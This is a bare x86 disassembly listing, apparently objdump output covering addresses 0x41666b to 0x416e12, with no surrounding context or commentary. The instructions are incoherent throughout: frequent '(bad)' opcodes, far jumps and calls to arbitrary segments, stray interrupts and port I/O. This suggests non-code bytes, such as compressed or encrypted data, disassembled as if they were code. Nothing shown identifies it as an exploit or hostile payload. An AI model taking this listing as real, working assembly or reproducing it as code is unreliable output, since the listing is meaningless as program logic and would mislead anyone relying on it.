  41666b:	jge    0x416683
  41666d:	jne    0x41661b
  41666f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416670:	cmp    dh,BYTE PTR [eax]
  416672:	dec    ebx
  416673:	(bad)  
  416674:	xchg   esi,ebp
  416676:	inc    ebp
  416677:	dec    edi
  416678:	arpl   WORD PTR [edi-0x383568e2],sp
  41667e:	sub    DWORD PTR [esi+0x53],0xffffff95
  416682:	out    0x4b,al
  416684:	aas    
  416685:	fcom   QWORD PTR [eax]
  416687:	fs xchg ebx,eax
  416689:	add    eax,0xcd90ae70
  41668e:	pop    eax
  41668f:	inc    cx
  416691:	ds call 0xf421:0x50bea8c6
  416699:	ins    DWORD PTR es:[edi],dx
  41669a:	adc    ah,BYTE PTR [ecx-0x78fa9253]
  4166a0:	and    BYTE PTR [esp+eax*1],cl
  4166a3:	add    ebx,DWORD PTR [eax]
  4166a5:	mov    edi,fs
  4166a7:	stos   DWORD PTR es:[edi],eax
  4166a8:	adc    esi,0xffffffe1
  4166ab:	xor    esp,DWORD PTR [eax]
  4166ad:	pusha  
  4166ae:	xchg   DWORD PTR [esi-0x64],edx
  4166b1:	test   DWORD PTR [ecx-0x6469a898],esp
  4166b7:	pop    ecx
  4166b8:	mov    ah,0xcd
  4166ba:	add    bh,BYTE PTR [ecx+0x37]
  4166bd:	dec    ebp
  4166be:	pop    eax
  4166bf:	fwait
  4166c0:	pusha  
  4166c1:	jno    0x4166cd
  4166c3:	push   ecx
  4166c4:	lds    ebx,FWORD PTR [ebx+ecx*8+0x1b358770]
  4166cb:	add    BYTE PTR [edi],ch
  4166cd:	cdq    
  4166ce:	jg     0x4166d2
  4166d0:	jbe    0x41671c
  4166d2:	call   FWORD PTR [edi+0x58159b6b]
  4166d8:	adc    DWORD PTR [ecx],ebx
  4166da:	cdq    
  4166db:	in     al,dx
  4166dc:	lahf   
  4166dd:	lock sub BYTE PTR [esi+0x31],dl
  4166e1:	fnstcw WORD PTR [edi+0xd]
  4166e4:	add    al,0x36
  4166e6:	dec    ebp
  4166e7:	cwde   
  4166e8:	adc    al,0x15
  4166ea:	dec    esi
  4166eb:	cli    
  4166ec:	mov    edi,DWORD PTR [esi]
  4166ee:	in     eax,0xc
  4166f0:	fnstsw WORD PTR [esi-0x5d]
  4166f3:	mov    eax,0x3a5ee1cb
  4166f8:	cdq    
  4166f9:	addr16 and eax,0x8c8fe40b
  4166ff:	test   BYTE PTR [ebx+0x79],bh
  416702:	stc    
  416703:	ja     0x4166a7
  416705:	jle    0x4166a7
  416707:	(bad)  
  416708:	je     0x41671c
  41670a:	mov    edi,0x8468176a
  41670f:	jns    0x41669d
  416711:	call   0x1355bdf5
  416716:	rol    BYTE PTR [ebx-0x484f337d],1
  41671c:	clc    
  41671d:	push   cs
  41671e:	(bad)  
  41671f:	fistp  DWORD PTR [ecx+ebp*1]
  416722:	(bad)  
  416723:	jns    0x4166c4
  416725:	mov    ebx,0x7e07bce9
  41672a:	jnp    0x4166be
  41672c:	xor    bh,BYTE PTR [eax-0x7df645db]
  416732:	mov    ebx,ecx
  416734:	int3   
  416735:	adc    eax,0xbb0f000f
  41673a:	shl    DWORD PTR [edx-0x2a168937],cl
  416740:	add    al,0x69
  416742:	push   esi
  416743:	inc    edi
  416744:	aas    
  416745:	jecxz  0x416706
  416747:	dec    edi
  416748:	sub    cl,BYTE PTR [edx]
  41674a:	mov    edx,0xd10f8963
  41674f:	dec    ecx
  416750:	loopne 0x4167cc
  416752:	fiadd  WORD PTR [ecx-0x76b8f945]
  416758:	aaa    
  416759:	in     al,0xdf
  41675b:	imul   esi,DWORD PTR [esi+ebp*1+0xe],0xb6d26d27
  416763:	(bad)  
  416764:	dec    edx
  416765:	mov    al,BYTE PTR [edx-0x5b]
  416768:	push   ebx
  416769:	push   ebp
  41676a:	fs mov ebx,0x210e56fb
  416770:	arpl   WORD PTR [edi+esi*4+0x2a9a9916],cx
  416777:	dec    ebx
  416778:	test   DWORD PTR [esi-0x27],edx
  41677b:	sbb    DWORD PTR [esi+0x61f94196],esi
  416781:	pop    esp
  416782:	sbb    DWORD PTR [ecx],ebp
  416784:	cs xchg esp,eax
  416786:	jg     0x41672b
  416788:	pushf  
  416789:	fistp  DWORD PTR [edi]
  41678b:	fs push ecx
  41678d:	pusha  
  41678e:	inc    eax
  41678f:	push   eax
  416790:	js     0x4167aa
  416792:	imul   DWORD PTR [ebp+eiz*4+0x47ded15d]
  416799:	(bad)  
  41679a:	je     0x416765
  41679c:	cli    
  41679d:	into   
  41679e:	fidiv  DWORD PTR [ebx+0x23f9482f]
  4167a4:	out    0x50,al
  4167a6:	inc    ebp
  4167a7:	arpl   WORD PTR [eax],bx
  4167a9:	fst    st(6)
  4167ab:	xchg   DWORD PTR [esi+0x37197a87],ecx
  4167b1:	or     DWORD PTR [ebp-0x256b89d9],edi
  4167b7:	jp     0x41676c
  4167b9:	sub    dh,BYTE PTR [edi+edx*8+0x5c5d2aa5]
  4167c0:	popf   
  4167c1:	mov    esi,0x619b22e6
  4167c6:	or     dl,BYTE PTR [ebx]
  4167c8:	ror    BYTE PTR [eax-0x6e],1
  4167cb:	cmp    esi,DWORD PTR ds:0x9defa5f1
  4167d1:	ins    DWORD PTR es:[edi],dx
  4167d2:	mov    dl,0xe6
  4167d4:	jmp    0x6d5b:0x2be54d07
  4167db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167dc:	jnp    0x416776
  4167de:	ret    
  4167df:	and    al,0xbc
  4167e1:	daa    
  4167e2:	cdq    
  4167e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167e4:	adc    al,0xdc
  4167e6:	imul   esp,DWORD PTR [eax+0x3],0x6c
  4167ea:	call   0x22c7:0xd416a38f
  4167f1:	adc    BYTE PTR ds:0x1df24ac6,ah
  4167f7:	in     eax,0xe1
  4167f9:	imul   esp,edx,0x7556122d
  4167ff:	inc    esi
  416800:	push   0x1b
  416802:	mov    es,WORD PTR [ecx+ebx*8+0x5c]
  416806:	jb     0x4167f3
  416808:	push   ebp
  416809:	add    eax,0x190b5f82
  41680e:	daa    
  41680f:	mov    esi,0x42f36949
  416814:	mov    ch,BYTE PTR [edi+0x7c]
  416817:	inc    ecx
  416818:	cld    
  416819:	push   DWORD PTR [eax]
  41681b:	inc    esp
  41681c:	loopne 0x416868
  41681e:	sbb    al,BYTE PTR [ebx]
  416820:	(bad)  
  416821:	aam    0x5f
  416823:	pop    ds
  416824:	add    al,0x7c
  416826:	dec    ecx
  416827:	ficomp DWORD PTR [ebp+0x75]
  41682a:	fsubr  st(2),st
  41682c:	lahf   
  41682d:	push   cs
  41682e:	jmp    0x558d:0xe141c9d0
  416835:	call   FWORD PTR es:[edi+0x74]
  416839:	ss inc esi
  41683b:	mov    esi,0xdfddc2bc
  416840:	fs call 0x9161d800
  416846:	int3   
  416847:	adc    bl,BYTE PTR [esi+eiz*2]
  41684a:	jp     0x41686f
  41684c:	or     BYTE PTR [edx],ch
  41684e:	sar    DWORD PTR [ebp-0x7339eced],1
  416854:	pop    ebp
  416855:	ds loop 0x416842
  416858:	ss dec esp
  41685a:	sbb    edi,DWORD PTR [edi]
  41685c:	loopne 0x416824
  41685e:	test   eax,0x58ac8a5
  416863:	loope  0x41687d
  416865:	(bad)  
  416866:	pop    ss
  416867:	loop   0x41681c
  416869:	and    ah,BYTE PTR [esi+esi*8+0x41b00c2c]
  416870:	xchg   esp,eax
  416871:	jo     0x41683f
  416873:	mov    WORD PTR [esi],?
  416875:	sub    BYTE PTR [edi+0x16ee4eb5],al
  41687b:	jl     0x41684a
  41687d:	scas   al,BYTE PTR es:[edi]
  41687e:	jo     0x4168e4
  416880:	sbb    ch,BYTE PTR [ebp-0x711b9fb]
  416886:	fadd   QWORD PTR [esi+ebp*1]
  416889:	and    BYTE PTR [edx],al
  41688b:	cmp    eax,0x5919b893
  416890:	(bad)  
  416891:	mov    edi,0x9eb2646a
  416896:	fst    QWORD PTR es:[edi+eax*4+0x74]
  41689b:	inc    ebx
  41689c:	or     ebx,DWORD PTR [esi]
  41689e:	xor    ah,BYTE PTR ds:0x6d9ea94d
  4168a4:	cmp    al,0x73
  4168a6:	inc    edx
  4168a7:	add    BYTE PTR [edx+eiz*1-0x3e79b79c],ch
  4168ae:	out    0xfb,al
  4168b0:	cld    
  4168b1:	mov    cl,0x82
  4168b3:	sub    al,0x88
  4168b5:	sub    eax,ecx
  4168b7:	in     al,dx
  4168b8:	xchg   edi,eax
  4168b9:	popa   
  4168ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168bb:	mov    cl,0x71
  4168bd:	xor    ch,BYTE PTR [edx]
  4168bf:	sti    
  4168c0:	cmp    DWORD PTR [ecx+edi*8+0x2],esi
  4168c4:	repz cdq 
  4168c6:	jb     0x416886
  4168c8:	sbb    eax,0xe7813528
  4168cd:	popa   
  4168ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168cf:	leave  
  4168d0:	out    0xb3,eax
  4168d2:	retf   
  4168d3:	xor    BYTE PTR [esi-0xc1ca9f1],ch
  4168d9:	jb     0x4168b4
  4168db:	mov    cl,BYTE PTR [edx-0x48c33111]
  4168e1:	pop    edi
  4168e2:	fsave  [esp+eax*8-0x476b44ef]
  4168ea:	mov    ah,0xad
  4168ec:	sbb    al,BYTE PTR [edi-0x30]
  4168ef:	in     al,0xcc
  4168f1:	push   es
  4168f2:	je     0x416882
  4168f4:	std    
  4168f5:	mov    edi,0x2e2f2bb5
  4168fa:	cmp    BYTE PTR [edi],ch
  4168fc:	es jae 0x416940
  4168ff:	mov    ah,0x86
  416901:	sub    eax,0x16eb2336
  416906:	es sbb eax,0x78aeba74
  41690c:	daa    
  41690d:	add    edx,DWORD PTR [eax+ecx*1+0x4]
  416911:	test   ecx,ecx
  416913:	pushf  
  416914:	mov    ecx,0xe2ff269f
  416919:	sub    DWORD PTR [eax],0xffffff80
  41691c:	mov    ds:0xc55c9334,al
  416921:	inc    ebx
  416922:	rcr    DWORD PTR [ebp-0x5b4be782],0x7f
  416929:	jecxz  0x416995
  41692b:	nop
  41692c:	test   DWORD PTR [ebp+edi*1+0x18],0x1b1b9e6f
  416934:	lods   eax,DWORD PTR ds:[esi]
  416935:	dec    edx
  416936:	push   ebp
  416937:	jg     0x416934
  416939:	and    DWORD PTR [edi],esp
  41693b:	std    
  41693c:	jecxz  0x4168c9
  41693e:	push   ebp
  41693f:	jmp    0x416941
  416941:	(bad)  
  416943:	std    
  416944:	imul   ebx,DWORD PTR [eax],0xffffffc5
  416947:	cmp    al,0x40
  416949:	lock clc 
  41694b:	sqrtps xmm1,xmm0
  41694e:	icebp  
  41694f:	xchg   esp,eax
  416950:	das    
  416951:	lods   al,BYTE PTR ds:[esi]
  416952:	inc    ebp
  416953:	ror    DWORD PTR [eax],1
  416955:	add    eax,0x793ac19f
  41695a:	stc    
  41695b:	jmp    0xce4dafa
  416960:	mov    bl,0xd6
  416962:	outs   dx,DWORD PTR ds:[esi]
  416963:	out    0x5a,eax
  416965:	lds    esp,FWORD PTR [ebp-0x58]
  416968:	out    0x13,al
  41696a:	imul   ebp,DWORD PTR [ebp-0x7a],0x1fbf1184
  416971:	add    al,0xd4
  416973:	lods   eax,DWORD PTR ds:[esi]
  416974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416975:	lods   al,BYTE PTR ds:[esi]
  416976:	out    0x9b,al
  416978:	jns    0x41693d
  41697a:	cli    
  41697b:	mov    edi,0x87b2647b
  416980:	push   esp
  416981:	add    edi,0xa8fe5af8
  416987:	jg     0x416921
  416989:	nop
  41698a:	call   DWORD PTR [esi-0x23e19bbf]
  416990:	adc    eax,0x21f05ad0
  416995:	cmp    eax,0xc22b6269
  41699a:	in     eax,dx
  41699b:	mov    DWORD PTR [edx-0x1f],eax
  41699e:	push   ss
  41699f:	jg     0x416a18
  4169a1:	inc    esp
  4169a2:	mov    dh,0xa9
  4169a4:	cmp    ch,bh
  4169a6:	push   ecx
  4169a7:	add    eax,0xcc1ca364
  4169ac:	mov    ss,WORD PTR [eax-0x96b3bf1]
  4169b2:	mov    eax,ds:0x10c6ab2c
  4169b7:	nop
  4169b8:	xchg   ecx,eax
  4169b9:	inc    eax
  4169ba:	cmp    dh,ah
  4169bc:	sbb    eax,0x57c092f5
  4169c1:	ja     0x41699a
  4169c3:	add    edi,edx
  4169c5:	sub    bh,cl
  4169c7:	or     dl,BYTE PTR [esi-0x1f]
  4169ca:	repnz lea ebp,[ecx+0x29]
  4169ce:	shr    DWORD PTR [edx],cl
  4169d0:	sbb    eax,0xb03dce7b
  4169d5:	rcl    DWORD PTR [esi-0xf],1
  4169d8:	dec    edx
  4169d9:	mov    dh,0x9c
  4169db:	mov    eax,edi
  4169dd:	sub    al,0x86
  4169df:	or     BYTE PTR [esi+0x1a],al
  4169e2:	enter  0x3b2b,0xc1
  4169e6:	ret    
  4169e7:	sti    
  4169e8:	cld    
  4169e9:	xchg   edi,eax
  4169ea:	sar    DWORD PTR [ecx],cl
  4169ec:	add    BYTE PTR [esi+ebp*2],ah
  4169ef:	dec    esp
  4169f0:	lods   eax,DWORD PTR ds:[esi]
  4169f1:	jmp    0x4169fb
  4169f3:	rcr    DWORD PTR [eax+edi*1-0x4b],cl
  4169f7:	in     eax,0x6e
  4169f9:	out    dx,al
  4169fa:	stc    
  4169fb:	les    ebp,FWORD PTR [ebx-0x72ef0b10]
  416a01:	nop
  416a02:	leave  
  416a03:	jmp    0xa311:0x6733d446
  416a0a:	and    esi,edi
  416a0c:	cmc    
  416a0d:	shl    DWORD PTR [ecx+0x44],1
  416a10:	sar    DWORD PTR ds:[ebx+0x230e47a3],1
  416a17:	out    0x45,eax
  416a19:	loop   0x416a18
  416a1b:	or     edi,esp
  416a1d:	inc    ebp
  416a1e:	dec    edi
  416a1f:	push   ds
  416a20:	fnsave [edx-0x3231ac86]
  416a26:	cld    
  416a27:	xchg   ecx,eax
  416a28:	add    al,0x19
  416a2a:	shl    eax,0x2e
  416a2d:	dec    ecx
  416a2e:	ds jo  0x416a72
  416a31:	inc    esi
  416a32:	aad    0x12
  416a34:	leave  
  416a35:	lea    edi,[ecx+0x7c]
  416a38:	ss je  0x416a47
  416a3b:	jl     0x416a0b
  416a3d:	mov    DWORD PTR [edx+eiz*1],ecx
  416a40:	pop    DWORD PTR [ecx]
  416a42:	jp     0x416a3a
  416a44:	push   edx
  416a45:	adc    edx,DWORD PTR [ebp-0x74d6f813]
  416a4b:	stc    
  416a4c:	sub    al,0x3f
  416a4e:	dec    ebx
  416a4f:	out    dx,al
  416a50:	inc    ebp
  416a51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a52:	adc    cl,BYTE PTR [edx-0xa]
  416a55:	mov    esp,0xe1d27a07
  416a5a:	es xchg ebp,eax
  416a5c:	inc    ecx
  416a5d:	jp     0x416ac4
  416a5f:	enter  0x7307,0x59
  416a63:	iret   
  416a64:	mov    al,ds:0xb2eee38
  416a69:	test   eax,0xcf6187eb
  416a6e:	(bad)  [edi-0x780b58d3]
  416a74:	inc    edx
  416a75:	mov    ds:0x4515087b,al
  416a7a:	mov    ds:0xb02d24f1,al
  416a7f:	xchg   edx,eax
  416a80:	push   eax
  416a81:	(bad)  
  416a82:	test   BYTE PTR [edi-0x5],al
  416a85:	imul   DWORD PTR [ecx+0x46]
  416a88:	pop    esi
  416a89:	mov    ebx,DWORD PTR [ebx]
  416a8b:	mov    cl,0x28
  416a8d:	mov    edx,0x7d7040b0
  416a92:	sbb    ebp,ebp
  416a94:	sbb    BYTE PTR [ebx+0x2a],dl
  416a97:	lea    edi,[edx]
  416a99:	jg     0x416a3a
  416a9b:	cmp    ch,bh
  416a9d:	mov    dl,0xce
  416a9f:	xchg   edx,eax
  416aa0:	inc    ebp
  416aa1:	loope  0x416a7d
  416aa3:	mov    ecx,0x380eb119
  416aa8:	jmp    ebp
  416aaa:	and    ebp,esi
  416aac:	enter  0x2a26,0x30
  416ab0:	lock rcl BYTE PTR [esi+0x773a551d],0x5f
  416ab8:	idiv   BYTE PTR [edx]
  416aba:	repnz fmul DWORD PTR [ebx+0x6f6bba26]
  416ac1:	(bad)  
  416ac2:	or     BYTE PTR ds:0x10b6d4df,bl
  416ac8:	ror    BYTE PTR [ecx+0x1715ccf6],0xf7
  416acf:	push   ecx
  416ad0:	das    
  416ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ad2:	daa    
  416ad3:	rcr    BYTE PTR [edx],0xfd
  416ad6:	das    
  416ad7:	add    al,0x19
  416ad9:	imul   esi,DWORD PTR [eax],0xfffffffd
  416adc:	in     al,dx
  416add:	inc    esp
  416ade:	icebp  
  416adf:	aam    0xd5
  416ae1:	sub    al,0x5e
  416ae3:	out    0x1d,al
  416ae5:	mov    ebx,0xba455c48
  416aea:	mov    ebp,0x9e7e10d1
  416aef:	mov    cs,ebp
  416af1:	rcr    BYTE PTR [ebp+0x2a],0xf2
  416af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416af6:	mov    esi,es
  416af8:	jl     0x416afc
  416afa:	inc    edi
  416afb:	dec    ecx
  416afc:	mov    dh,0x68
  416afe:	mov    esi,0x2bb53cb8
  416b03:	pop    esi
  416b04:	inc    ebx
  416b05:	imul   edi,DWORD PTR [esi-0x6ba96a43],0x6d
  416b0c:	test   DWORD PTR [eax],ebp
  416b0e:	fldenv [edi-0x16117e1e]
  416b14:	fsub   DWORD PTR [eax]
  416b16:	cmp    bl,dl
  416b18:	or     ebx,DWORD PTR [eax-0x7f599a05]
  416b1e:	xchg   esi,eax
  416b1f:	cmp    al,bh
  416b21:	and    edi,DWORD PTR [edx-0x5e0d7c8]
  416b27:	scas   al,BYTE PTR es:[edi]
  416b28:	inc    ecx
  416b29:	push   ebx
  416b2a:	faddp  st(3),st
  416b2c:	jne    0x416b55
  416b2e:	and    al,0xb5
  416b30:	push   ds
  416b31:	push   es
  416b32:	jl     0x416ae6
  416b34:	les    ebx,FWORD PTR [edi+0x7f]
  416b37:	lock scas al,BYTE PTR es:[edi]
  416b39:	and    al,0x87
  416b3b:	jb     0x416b9c
  416b3d:	push   0xffffffbe
  416b3f:	fst    QWORD PTR [eax]
  416b41:	mov    eax,ds:0x348e5781
  416b46:	or     ecx,DWORD PTR [ebp+0x4d7c97a5]
  416b4c:	stc    
  416b4d:	(bad)  
  416b4e:	test   cl,0x56
  416b51:	xchg   edx,eax
  416b52:	hlt    
  416b53:	pop    edx
  416b54:	sbb    bh,BYTE PTR [edx-0x12]
  416b57:	out    dx,al
  416b58:	jle    0x416aed
  416b5a:	out    0x9d,al
  416b5c:	imul   ecx,DWORD PTR [eax+ecx*2+0x2f],0x7a
  416b61:	fld    DWORD PTR [ecx-0x24]
  416b64:	pushf  
  416b65:	int3   
  416b66:	loopne 0x416aec
  416b68:	cmp    DWORD PTR [edx],ebp
  416b6a:	adc    ebp,DWORD PTR [edx+0xb941b22]
  416b70:	xor    DWORD PTR [esi+0x55],ecx
  416b73:	cld    
  416b74:	and    eax,0xb4364d4f
  416b79:	stc    
  416b7a:	jns    0x416b56
  416b7c:	mov    BYTE PTR [ecx],al
  416b7e:	in     eax,dx
  416b7f:	loop   0x416ba5
  416b81:	or     eax,0x72e7c4ad
  416b86:	(bad)  
  416b87:	sub    ah,dh
  416b89:	jns    0x416bce
  416b8b:	adc    al,0x5d
  416b8d:	mov    ds:0x960ffa0,al
  416b92:	cmp    eax,0x76ecceb7
  416b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b98:	out    dx,al
  416b99:	sbb    dl,bh
  416b9b:	ds int 0xa1
  416b9e:	je     0x416c00
  416ba0:	push   ss
  416ba1:	xchg   ecx,eax
  416ba2:	mov    al,0xc9
  416ba4:	scas   eax,DWORD PTR es:[edi]
  416ba5:	enter  0xaa0e,0x13
  416ba9:	mov    ebx,0x873bf79b
  416bae:	sub    BYTE PTR [edi+0x371b63da],bl
  416bb4:	sbb    al,0x39
  416bb6:	rol    edx,1
  416bb8:	dec    ecx
  416bb9:	xor    DWORD PTR [eax-0x7a],ebp
  416bbc:	aam    0x1
  416bbe:	xchg   DWORD PTR [edx+esi*4],eax
  416bc1:	outs   dx,DWORD PTR ds:[esi]
  416bc2:	test   DWORD PTR [ebp-0x765c37c4],ecx
  416bc8:	push   ecx
  416bc9:	push   0x73
  416bcb:	jo     0x416c29
  416bcd:	shr    DWORD PTR [esi],1
  416bcf:	xlat   BYTE PTR ds:[ebx]
  416bd0:	jnp    0x416be6
  416bd2:	int    0x36
  416bd4:	leave  
  416bd5:	repz in al,0x20
  416bd8:	inc    ecx
  416bd9:	add    ah,BYTE PTR [eax+ecx*8-0x4b]
  416bdd:	jecxz  0x416be1
  416bdf:	sbb    eax,0xc96ec04a
  416be4:	les    esi,FWORD PTR [ebx]
  416be6:	aas    
  416be7:	inc    edi
  416be8:	add    DWORD PTR [edi],esi
  416bea:	xchg   esp,eax
  416beb:	or     DWORD PTR [ecx+0x43],0xf5450576
  416bf2:	and    eax,0x9377c952
  416bf7:	jecxz  0x416b7d
  416bf9:	sahf   
  416bfa:	ficomp WORD PTR [edi]
  416bfc:	add    al,0x42
  416bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bff:	xchg   edi,eax
  416c00:	dec    esp
  416c01:	and    al,0xc5
  416c03:	xor    esp,DWORD PTR [esi+0x13]
  416c06:	mov    BYTE PTR [ebp-0x34],bh
  416c09:	sti    
  416c0a:	cmc    
  416c0b:	clc    
  416c0c:	ds jmp 0xa558:0xc364fcf9
  416c14:	jmp    0x8771:0xadebe2b5
  416c1b:	mov    ss:0xa4f8ee4a,eax
  416c21:	and    eax,esp
  416c23:	lods   eax,DWORD PTR ds:[esi]
  416c24:	inc    eax
  416c25:	out    0xb1,al
  416c27:	rcl    BYTE PTR [ecx+0xd8864d1],cl
  416c2d:	xor    al,0x5b
  416c2f:	or     eax,0x5ad9d2b4
  416c34:	jge    0x416c52
  416c36:	jge    0x416c15
  416c38:	out    dx,eax
  416c39:	jmp    0xf96e:0x734315e8
  416c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c41:	sub    BYTE PTR [edi+0x9],ah
  416c44:	mov    eax,ds:0xd6c1faa4
  416c49:	(bad)  
  416c4a:	shr    BYTE PTR [ebx+0x4e2047c0],1
  416c50:	add    DWORD PTR [eax+edi*2],0x12
  416c54:	enter  0xa451,0xec
  416c58:	out    dx,eax
  416c59:	loopne 0x416cc9
  416c5b:	pusha  
  416c5c:	sbb    dl,bh
  416c5e:	lds    ecx,FWORD PTR [eax]
  416c60:	dec    DWORD PTR [ebx-0x79395f71]
  416c66:	dec    edx
  416c67:	mov    ecx,0xb9c92581
  416c6c:	fstp   DWORD PTR [edx+0x70]
  416c6f:	xchg   ebp,eax
  416c70:	xchg   DWORD PTR [esi-0x77468fe7],ebp
  416c76:	xchg   BYTE PTR [edi],bl
  416c78:	xor    al,0xdd
  416c7a:	xchg   edi,eax
  416c7b:	cmp    DWORD PTR cs:[edi],ebp
  416c7e:	push   esp
  416c7f:	or     ah,0xa4
  416c82:	jno    0x416c97
  416c84:	push   edx
  416c85:	data16 add ch,BYTE PTR [eax]
  416c88:	adc    al,BYTE PTR [edx-0x32]
  416c8b:	pop    es
  416c8c:	xor    BYTE PTR [eax+0x40],bh
  416c8f:	mov    dl,0x82
  416c91:	jo     0x416ccf
  416c93:	call   0x7b9c:0xdfbdd2e0
  416c9a:	push   ebx
  416c9b:	jmp    0xd595ad3c
  416ca0:	nop
  416ca1:	push   ebp
  416ca2:	or     al,dh
  416ca4:	ret    
  416ca5:	lock pop ss
  416ca7:	dec    ecx
  416ca8:	dec    edx
  416ca9:	into   
  416caa:	push   0xffffff8b
  416cac:	stos   BYTE PTR es:[edi],al
  416cad:	mov    edx,0xa97ff5c9
  416cb2:	xor    eax,0x746ef06d
  416cb7:	pop    ss
  416cb8:	sub    ch,BYTE PTR [ebx+ebp*8-0x35]
  416cbc:	dec    eax
  416cbd:	pop    esi
  416cbe:	inc    ebp
  416cbf:	std    
  416cc0:	dec    ecx
  416cc1:	pop    edi
  416cc2:	jg     0x416ce9
  416cc4:	sti    
  416cc5:	and    al,0xf2
  416cc7:	out    dx,al
  416cc8:	ja     0x416cb4
  416cca:	push   es
  416ccb:	dec    esi
  416ccc:	retf   
  416ccd:	sub    esi,edi
  416ccf:	mov    ?,ecx
  416cd1:	int    0xea
  416cd3:	popf   
  416cd4:	fwait
  416cd5:	mov    WORD PTR [edi+0x50],es
  416cd8:	inc    ebx
  416cd9:	cmp    eax,0xbd93b628
  416cde:	sub    BYTE PTR [edi],al
  416ce0:	mov    ds,WORD PTR ds:0x9b9f46ca
  416ce6:	sub    al,BYTE PTR [ebp+0x1f2b0d83]
  416cec:	inc    eax
  416ced:	dec    esp
  416cee:	push   ebx
  416cef:	aaa    
  416cf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cf1:	outs   dx,BYTE PTR ds:[esi]
  416cf2:	push   ecx
  416cf3:	cli    
  416cf4:	and    bh,BYTE PTR [ebx+ecx*4+0x5e467d51]
  416cfb:	icebp  
  416cfc:	outs   dx,DWORD PTR ds:[esi]
  416cfd:	cmp    al,0xcb
  416cff:	fcomp  DWORD PTR [eax]
  416d01:	pop    esp
  416d02:	fsubr  st(0),st
  416d04:	std    
  416d05:	and    dh,BYTE PTR [ebp-0x2f]
  416d08:	dec    esi
  416d09:	xlat   BYTE PTR ds:[ebx]
  416d0a:	dec    edi
  416d0b:	pusha  
  416d0c:	imul   al
  416d0e:	fdiv   QWORD PTR [esi]
  416d10:	add    dl,dh
  416d12:	xor    esp,DWORD PTR [ebx-0xda78d77]
  416d18:	test   eax,0xaaec2440
  416d1d:	out    dx,eax
  416d1e:	mov    bl,0x48
  416d20:	and    al,0x82
  416d22:	push   edx
  416d23:	or     bl,al
  416d25:	xor    al,bh
  416d27:	rol    DWORD PTR [eax+0x51],cl
  416d2a:	sub    BYTE PTR [ebx],cl
  416d2c:	xor    cl,BYTE PTR [esi]
  416d2e:	hlt    
  416d2f:	shr    BYTE PTR [ebp+eiz*1+0x76b0847d],0x97
  416d37:	lods   al,BYTE PTR ds:[esi]
  416d38:	(bad)  
  416d39:	retf   
  416d3a:	test   edi,ebx
  416d3c:	ret    
  416d3d:	adc    eax,0x5a9b6e53
  416d42:	inc    esp
  416d43:	sbb    esp,esi
  416d45:	xor    DWORD PTR [edx-0x7b9ac6a4],eax
  416d4b:	pop    edx
  416d4c:	or     eax,0xdd8b4263
  416d51:	mov    ?,WORD PTR [edi]
  416d53:	inc    ebx
  416d54:	js     0x416d0a
  416d56:	sbb    BYTE PTR [ecx],0x9c
  416d59:	mov    ds:0x5a2bc7d6,eax
  416d5e:	mov    cl,0x6b
  416d60:	das    
  416d61:	xchg   BYTE PTR es:[edx-0x3752af4c],bh
  416d68:	fsub   DWORD PTR [edx]
  416d6a:	dec    edi
  416d6b:	repz stc 
  416d6d:	aas    
  416d6e:	and    esi,0xffffff9b
  416d71:	dec    ecx
  416d72:	mov    esp,ds
  416d74:	push   ebx
  416d75:	xor    eax,0xa775a848
  416d7a:	ds popa 
  416d7c:	jmp    0x47c2:0xb8ee397d
  416d83:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  416d85:	test   dx,dx
  416d88:	sbb    DWORD PTR ds:[eax+eax*4],edx
  416d8c:	ret    
  416d8d:	ret    
  416d8e:	clc    
  416d8f:	out    dx,al
  416d90:	adc    BYTE PTR [ebx+0x1bb5213d],bl
  416d96:	fbld   TBYTE PTR [edi+0x1554ff39]
  416d9c:	adc    eax,0x366aaf3a
  416da1:	xlat   BYTE PTR ds:[ebx]
  416da2:	push   edx
  416da3:	int    0xa6
  416da5:	sti    
  416da6:	push   eax
  416da7:	leave  
  416da8:	sti    
  416da9:	setae  BYTE PTR [edx-0x2c]
  416dad:	ins    BYTE PTR es:[edi],dx
  416dae:	push   0x164d274b
  416db3:	jl     0x416d89
  416db5:	je     0x416d9d
  416db7:	pop    ecx
  416db8:	in     al,0x30
  416dba:	adc    DWORD PTR [ebp-0x53],eax
  416dbd:	dec    esi
  416dbe:	test   DWORD PTR [eax+ebp*2-0x5751db8e],eax
  416dc5:	pushf  
  416dc6:	mov    esi,?
  416dc8:	test   DWORD PTR [ebx],esi
  416dca:	cmc    
  416dcb:	mov    WORD PTR [edi-0x6dfa1b6],?
  416dd1:	xchg   edx,eax
  416dd2:	or     ecx,DWORD PTR [eax+0x1a]
  416dd5:	mov    edi,0xb4aa3c89
  416dda:	enter  0xb369,0xfd
  416dde:	xlat   BYTE PTR ds:[ebx]
  416ddf:	fadd   QWORD PTR [edi]
  416de1:	push   ebp
  416de2:	dec    DWORD PTR [edi]
  416de4:	mov    eax,0x38bd4e96
  416de9:	xor    DWORD PTR [ecx-0x5d66403b],esp
  416def:	ins    BYTE PTR es:[edi],dx
  416df0:	xchg   edi,eax
  416df1:	dec    edx
  416df2:	outs   dx,DWORD PTR ds:[esi]
  416df3:	mov    WORD PTR [edi],gs
  416df5:	sbb    cl,BYTE PTR [edx]
  416df7:	xchg   esp,eax
  416df8:	jo     0x416e77
  416dfa:	pop    es
  416dfb:	pop    edx
  416dfc:	mov    ch,0xc
  416dfe:	aam    0xe1
  416e00:	xchg   edx,eax
  416e01:	imul   esi,DWORD PTR [ebx-0x104f9727],0x6f
  416e08:	xor    BYTE PTR [eax+ebx*2-0x4b],al
  416e0c:	mov    esi,0x82b96db
  416e11:	cwde   
  416e12:	lods   eax,DWORD PTR ds:[esi]
